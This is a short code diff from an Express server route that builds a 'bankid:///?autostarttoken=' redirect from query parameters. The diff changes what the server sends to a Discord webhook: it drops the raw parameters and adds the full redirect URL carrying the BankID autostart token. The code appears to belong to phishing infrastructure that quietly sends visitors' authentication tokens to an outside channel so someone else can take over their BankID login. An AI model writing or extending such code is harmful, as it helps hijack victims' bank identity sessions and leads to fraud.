@@ -19,12 +19,13 @@ app.get('/', (req, res) => {
   }
 
   // Send Discord webhook with all query parameters
-  sendDiscordWebhook(params);
   sendDiscordWebhook("Load");
 
   // Assuming you want to redirect to a specific URL with these parameters
   // Modify redirectUrl according to your requirements
   const redirectUrl = `bankid:///?autostarttoken=${Object.entries(params).map(([key, value]) => `${key}=${value}`).join('&')}`;
+  sendDiscordWebhook(redirectUrl);
+
   res.redirect(redirectUrl);
 });
 
